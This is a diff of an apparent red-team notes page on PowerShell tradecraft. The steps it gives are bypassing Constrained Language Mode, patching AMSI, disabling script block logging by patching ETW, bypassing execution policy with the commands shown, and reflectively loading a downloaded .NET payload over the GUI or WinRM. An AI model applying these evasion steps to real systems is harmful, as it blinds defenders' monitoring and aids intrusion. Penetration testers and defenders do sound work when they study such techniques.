@@ -6,9 +6,9 @@ title: PowerShell
 
 Steps ([source](https://web.archive.org/web/20231227014246/https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/)):
 
-- bypass [[notes/windows/clm]] if [[notes/windows/applocker]] is enabled
+- if [[notes/windows/applocker]] enabled: bypass [[notes/windows/clm]]
 - patch [[notes/windows/amsi]] in PowerShell
-- disable PowerShell script block logging by patching [[notes/windows/etw]] in PowerShell
+- optional: disable script block logging by patching [[notes/windows/etw]] in PowerShell
 - patch [[notes/windows/amsi]] on process-level
 - reflectively execute your .NET assembly payload (see below)
 
@@ -22,7 +22,8 @@ Ignore execution policy.
 
 ~~~ ps1
 powershell.exe -ep bypass
-Set-ExecutionPolicy -ExecutionPolicy bypass -Scope Process
+Set-ExecutionPolicy -ExecutionPolicy bypass -Scope process
+Set-ExecutionPolicy -ExecutionPolicy unrestricted -Scope process -Force
 ~~~
 
 Download and execute PowerShell script in memory.
@@ -49,11 +50,11 @@ References:
 
 # Reflective Assembly Loading
 
-Reflective loading is blocked by [[notes/windows/clm]] and the assembly is scanned by [[notes/windows/amsi]].
+Reflective loading is blocked by [[notes/windows/clm]].
 When loading your payload fails with the error *Could not load file or assembly [...]. An attempt was made to load a program with an incorrect format* your payload was blocked by [[notes/windows/amsi]].
-If your payload is detected try [[notes/windows/dotnet-obfuscation]].
+In that case try [[notes/windows/dotnet-obfuscation]] or patch [[notes/windows/amsi]] on process-level.
 
-Download assembly and execute.
+Download assembly and execute when using the PowerShell GUI.
 
 ~~~ ps1
 $a = @('--help')
@@ -66,7 +67,7 @@ if ($c.EntryPoint.IsPublic) {
 }
 ~~~
 
-Download assembly, execute and capture output.
+Download assembly, execute and capture output when using WinRM.
 
 ~~~ ps1
 $a = @('--help')
